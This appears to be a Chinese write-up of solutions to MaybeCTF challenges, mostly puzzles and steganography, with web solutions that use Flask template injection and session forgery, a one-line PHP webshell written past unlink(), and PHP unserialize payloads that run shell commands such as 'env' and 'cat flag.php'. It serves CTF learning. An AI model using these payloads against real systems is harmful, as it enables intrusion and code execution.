# [MaybeCTF] 部分题目WP

## [MaybeCTF官方link](https://dawn.whu.edu.cn/challenges)

[toc]



# 个人赛

## MISC

### 1. sign_in

签到题，加入频道组织（qq channel），获得flag

### 2. rack your brain

打开附件，得到：

- 佛又曰：输蒙诃地呼阿罚佛输他耶提咩罚墀遮驮萨唵陀沙帝怛写遮呼写尼地摩舍咩那栗怛阇伊佛烁喝度醯嚧卢埵楞呼菩摩孕帝数写菩佛皤佛迦沙苏罚栗醯埵萨遮豆陀孕唵呼钵室地蒙诃无穆度羯阿佛帝舍度夜娑佛皤输孕参啰谨数墀咩谨罚那阇输他帝耶唎度谨参婆栗醯栗罚驮遮写烁伽驮阇怛唎墀夜嚧舍阿驮呼菩墀他度数墀他吉曳娑呼佛地唎楞利墀利豆数夜苏帝啰提南迦孕舍夜尼娑卢婆遮南卢阿唵嚧沙墀钵阇蒙佛曳谨萨那参呼曳阿曳参耶埵陀地呼苏无墀地度烁醯提那婆萨阇墀提参摩提诃佛遮提阇参舍豆度呼栗罚烁夜菩摩苏墀埵嚧提楞写佛地耶唵罚输钵墀罚伽唎利沙驮栗沙皤参孕孕皤参烁唎舍怛曳孕驮烁帝地利诃哆唎呼唎南室罚罚驮无驮伊婆陀遮曳阇迦阇参利豆钵室无菩吉迦啰唵钵耶俱伊他卢无喝婆唎菩啰输驮羯哆唵参婆俱伽烁遮羯帝烁沙沙南罚喝醯埵唎啰地迦萨婆婆那哆尼阿婆皤室数卢豆哆墀孕谨豆迦哆醯喝俱醯萨穆唎无谨夜卢室墀夜皤唎佛遮哆俱佛参醯他喝孕喝悉耶数俱写吉摩钵穆数烁喝夜伽豆咩尼喝曳参阿佛夜那怛曳无啰怛驮唵伊嚧萨伊皤唵埵无利写卢蒙羯佛嚧夜数南伊喝苏呼参唵舍佛伽皤栗豆菩帝蒙提南遮醯伽孕伊摩提尼羯醯羯伊那输悉皤舍孕伊陀尼提诃耶钵娑室蒙豆嚧利楞陀佛伊室嚧喝谨穆蒙谨室俱醯唎南摩伊唵羯孕钵诃呼地羯地穆醯墀迦嚧提豆罚唎怛咩沙呼迦遮阇那参沙佛唵烁咩怛啰室醯咩卢埵夜楞参驮娑栗醯怛无墀啰苏悉写阿娑舍阇尼蒙羯啰阿提俱埵遮南利舍菩唵啰孕嚧驮怛咩那沙摩怛怛写那醯烁怛苏南蒙地耶喝阿伽苏豆苏卢苏豆墀卢输楞尼呼阿摩南遮楞谨夜楞埵埵尼伽曳数南墀唵诃娑埵迦陀谨哆伽菩驮楞萨萨楞度墀悉楞啰曳谨悉曳婆摩写那沙烁唎羯穆谨地漫漫

关键词为“佛又曰” ， 搜索到与[佛论禅重制版](https://tools.takuron.top/talk-with-buddha/)，解密得到：

- ++++++++[>>++>++++>++++++>++++++++>++++++++++>++++++++++++>++++++++++++++>++++++++++++++++>++++++++++++++++++>++++++++++++++++++++>++++++++++++++++++++++>++++++++++++++++++++++++>++++++++++++++++++++++++++>++++++++++++++++++++++++++++>++++++++++++++++++++++++++++++<<<<<<<<<<<<<<<<-]>>>>>>>>---.<+.>>-------.<<++.>>-----.<<+++.>>+++++++.----.<<++.-------.>>---.<<--.++.--.<<<++++++.>>>>>--.<<++.>----.>----.<---.<<<<<++++++++++..>>>>>>---.<-.>+++++++.<<<<<...>>>>>+++++++++++.

显然是经典的[Brainfuck](https://ctf.bugku.com/tool/brainfuck)，解密得到flag

### 3. thin_dog

伤害不高，侮辱性极强

附件是一段音频，很容易听出左右声道不一样

关掉右声道，仔细听左声道

依稀能听出来 Charlie Echo November Fox 等单词

把这几个作为关键词一搜，搜出[NATO phonetic alphabet](https://en.wikipedia.org/wiki/NATO_phonetic_alphabet)，凭借耳力辨认一番，得到flag

其中，下划线是underline，‘{’是left bracket，'}'是right bracket



## WEB

### 1. NO COPY

点进去，发现flag直接告诉你了，但是复制不了

直接查看源码，把源码复制下来，再去除其中的杂七杂八的东西，很容易得到flag

### 2. typing train

点进网页

![](https://s1.ax1x.com/2022/11/07/xjHDzj.png)

点击开始

![](https://s1.ax1x.com/2022/11/07/xjHBWQ.png)


查看源码

![](https://s1.ax1x.com/2022/11/07/xjHsQs.png)

发现要typing的内容甚至可以直接在源码里找到

写一个Python爬虫，循环爬取

```python
import requests
import re

url = "http://124.220.41.254:20002/index.php?start"

headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36',
           'Cookie': 'PHPSESSID=c6002ca2024fc388a7474942f03a3bee'}

res = requests.get(url,heads=heads)

if res.status_code == 200:
    raw_text = res.text
    print(raw_text)
    re_res = re.findall(r'<h1 class="typing">(.*)</h1>', raw_text,re.DOTALL)
    s=re_res[0]
    print(s)
    s = s.replace('\n', '')
    s = s.replace('\0', '')
    
    
for i in range(0,6667):
    url = "http://124.220.41.254:20002/index.php?input="+s
    res = requests.get(url,heads=heads)
    if res.status_code == 200:
    	raw_text = res.text
    	re_res = re.findall(r'<h1 class="typing">(.*)</h1>', raw_text,re.DOTALL)
    	s = re_res[0]
    	s = s.replace('\n', '')
    	s = s.replace('\0', '')
    	print(raw_text)

```

最后可以在输出的网页源代码开头看到flag

### 3. find_it

赛时因为没注意规则，卡了bug，开了扫描器扫了一波，结果扫到了

丢个正解

明显的中文提示，**就在这里**

![](https://s1.ax1x.com/2022/11/07/xjquCD.png)

看到css，发现下面多了一堆东西

![](https://s1.ax1x.com/2022/11/07/xjqm4O.png)

滑到最下面，get it

![](https://s1.ax1x.com/2022/11/07/xjqeUK.png)

base64解码得到flag



---



# 团队赛

## MISC

### 1. checkin

签到题

![](https://s1.ax1x.com/2022/11/07/xjq7a6.png)

查看网页源代码，找到签到记录

![](https://s1.ax1x.com/2022/11/07/xjqTVx.png)

写一个脚本跑一下（我选华小科）：

```python
import hashlib
for i in range(100000,1000000):
    data="2022111111111"+str(i)
    md5 = hashlib.md5(data.encode(encoding='UTF-8')).hexdigest()
    if(md5=="6a0a4c0bf572e2bc23505fb051230f36"):
        print(i)
```

得到签到码是972513

回头自己输个学号，末尾补上972513，求个md5，解决

### 2. 2战挑的邪正人鬼

题目名字很奇怪，是个反过来的

附件为2.piz，piz也是zip反过来

考虑是不是把文件反过来

写个脚本

```Python
with open('2.piz','rb') as f:
 
   with open('2.zip','wb') as g:
 
      g.write(f.read()[::-1])
```

得到zip，可以解压，得到文件yp.ssecnirp

显然一样的套路，反过来，写个脚本

```Python
with open('yp.ssecnirp','rb') as f:
 
   with open('princess.py','wb') as g:
 
      g.write(f.read()[::-1])
```

查看这个.py文件，仔细审查，发现端倪：中间有这样一段

```python
    text="wkhkuvcwtyfk{oSeh"
    "Tkinter Designer uses the Figma API\n"
    "lIxnimyyh0kunmbar"
    "to analyse a design file, then creates\n"
    "Rauwghesttbr1lGwig"
    "the respective code and files needed\n"
    "gebtibgt!o!d!p}"
    "for your GUI.\n\n"
```

去掉看起来比较正常的话（\n结尾的），得到

- wkhkuvcwtyfk{oSehlIxnimyyh0kunmbarRauwghesttbr1lGwiggebtibgt!o!d!p}

很像flag的形式，间隔一个字母跳着读，可得flag: whuctf{xxxx}

### 3. mia_is_gaming

社工题

![](https://s1.ax1x.com/2022/11/07/xjLsQH.png)



逻辑链条：

1.要么由playing games想到Steam，查一下账号，再找到GitHub

2.要么直接由call back to coding 想到GitHub

找到WHUMia的GitHub，得到Flag.zip，解压发现.git

显然这题就是考的git版本回溯，（由fake_flag和no_flag给出的提示也可以想到）

打开Flag中的flag，发现git，少了个'.'，补上

然后从.git中的logs中的HEAD查看到

```
0000000000000000000000000000000000000000 9b500572926b59d6d42e23714d1b43ad73b52e24 MaybeMia <XXXXXXXXXXXX@qq.com> 1666927290 +0800	commit (initial): add flag
```

所以直接git show，爆出flag

![](https://s1.ax1x.com/2022/11/07/xjLXkV.md.png)]

### 4. 幽霊楽団～Phantom Ensemble

歌曲很好听

.wav文件，听一遍，没有什么异常的地方

考虑使用SilentEye，decode得到in here.wav

听一下in here.wav 明显的Morse电码敲击声

查看波形图

![](https://s1.ax1x.com/2022/11/07/xjOrNV.png)

手动翻译成Morse电码，解码，得到：

```
PASSWORDISCUTE+DARKFLYING.JPG
```

不知道password有啥用，

尝试使用SilentEye来decode in here.wav

爆出actually in here.rar

解压得到biu.wav 和阴暗的飞行~.jpg，猜想阴暗的飞行~.jpg即为上面提到的darkflying.jpg

老套路，先用SilentEye，decode biu.wav，得到flag!.zip

需要密码，猜想密码就是cute加上图片内容

查看阴暗的飞行.jpg，

![](https://s1.ax1x.com/2022/11/07/xjODA0.jpg)

看到5位，尝试爆破，预计要**52天**，放弃

放大仔细查看图片，发现

![](https://s1.ax1x.com/2022/11/07/xjO07q.png)

剩下的5位就是rumia

flag!.zip的密码就是cuterumia

解压得到flag

### 5. 禁忌 四重存在

下载附件，得到一张png

尝试修改高度，不行

拿到虚拟机里面用binwalk扫一下

发现是png头，zip尾，还拆不开

**zip：我头呢**

[参考文献](https://lsybk.xyz/post/CTFmisc1.html)

用WinHex打开，寻找png文件的文件尾：AE 42 60 82，找到了之后，发现后面多了一堆东西

那就把前面的png删掉，用完就扔

寻找zip尾，zip的文件尾是：50 4B，从最后找起，很容易找到

接下来就要分析zip的头接在什么地方，（从网上找了个图）：

![](https://shuishangyun.github.io/2019/04/06/%E5%AF%B9zip%E5%8E%8B%E7%BC%A9%E5%8C%85%E9%80%9A%E7%94%A8%E6%A0%BC%E5%BC%8F%E7%9A%84%E8%AE%A4%E8%AF%86/2.png)

因为缺了zip的头，不妨试试找140000000800

一下子就找到了，补上504B0304，后缀改zip，可以解压，得到.tiff，又是残缺的，打不开

WinHex看一下，又缺了头

**tiff：我头呢**

补上文件头：49492A00，图片可以打开，左上角可以看到一串字符

然后就不知道了

然后我就把文献里的文件头和尾都试了一遍，找到了jpg的尾和gif的尾

**jpg/gif：我头呢**

其中还发现了一个秘密，就是几个文件之间都是用CHAMPION_FLAN隔断的，后知后觉了属于是

同理补上jpg的头和gif，打开图片，左上角又可以得到两串字符

拼接起来，即为flag

### 6. bird

本来这题应该是个签到题，结果还以为是原创密码，推了半天，从逻辑的角度试了很多种，均无果

以"bird"和给的提示"wire" "单表置换" + "密码"，并把中文翻译成英文（bird wire single symbol substitution cipher），在Google上面搜

搜到了[这个](https://www.dcode.fr/birds-on-a-wire-cipher)

对着海报输入密文即可解密得到flag。。。。

## WEB

### 1. 学籍管理

根据hint：flask，思考[flask模板注入](https://blog.csdn.net/qq_59950255/article/details/123215817?spm=1001.2101.3001.6650.2&utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-123215817-blog-122359928.pc_relevant_3mothn_strategy_and_data_recovery&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-2-123215817-blog-122359928.pc_relevant_3mothn_strategy_and_data_recovery&utm_relevant_index=5)

随便用个符合我们这几个年级学生的学号，随便搞个名字，都能登进去，然后~~被开除学籍~~进入留言板

{{config}}得到secret_key

用这篇博客里面的方法找到可以进行系统命令的**os._wrap_close类**

好像位置是在第133个

然后进行注入，获取到app.py

看到需要让usr=admin才能通过验证，考虑利用secret_key伪造session

[参考资料](https://blog.csdn.net/sinat_34761046/article/details/114991968)

基本上就可以解决这道题了

### 2. 写了就删

php审计

发现先创建文件，然后文件立马被删除

考虑如何绕过unlink()函数

搜集资料，发现只要filename = xxx.php/.

就可以写入文件但是绕过unlink()

于是写入一句话木马，成功连接

### 3. hack the earth

php审计

第一步先要通过以下判断：

```php
($addr1 !== $addr2 && md5($addr1) === md5($addr2))
```

md5强相等，可以传入两个数组： ?addr1[]=1&addr2[]=2；或者寻找哈希碰撞（不推荐）

```php
!preg_match('/admin/i', $key)
```

然后传入key里面不能有admin，随便传一个不是admin的，只要不是数字开头，都可行，因为要使intval($key)和'admin'匹配上

然后进入：

```php
echo 'admin';
unserialize($_POST['class']);
```

说明要构造一个payload

观察知道终级目标肯定是利用class Shell里面的system指令

```php
class Shell {
        public $cmd;
        function __construct($cmd) {
            $this->cmd = $cmd;
        }

        function __toString() {
            system($this->cmd);
        }
    }

```

考虑如何调用__toString()这一魔术方法，这时候就要构造pop链

发现有如下类可以利用：

```php
class Admin {
        public $name;
        function __destruct() {
            if ($this->name == 'admin') {
                echo 'Welcome! My master';
            } else {
                die('no!!! you are not my master');
            }
        }
    }
```

其中有一个$this->name=='admin'

如果在此处把$this赋一个Shell类，有判断字符串相等这一环节，就会强制调用Shell类里面的__toString()方法

所以构造Payload：

```
O:5:"Admin":1:{s:4:"name";O:5:"Shell":1:{s:3:"cmd";s:2:"ls";}}
```

以post方法传一个class参数进去

什么都没得到

换个姿势

```
O:5:"Admin":1:{s:4:"name";O:5:"Shell":1:{s:3:"cmd";s:5:"ls ./";}}
```

爆出了目录里面有flag.php

改payload，使用cd ./ && cat flag.php指令，得到flag里面的内容

![](https://s1.ax1x.com/2022/11/07/xjzFJ0.png)

发现FLAG是个env，是个环境变量

所以改payload

```
O:5:"Admin":1:{s:4:"name";O:5:"Shell":1:{s:3:"cmd";s:3:"env";}}
```

得到flag
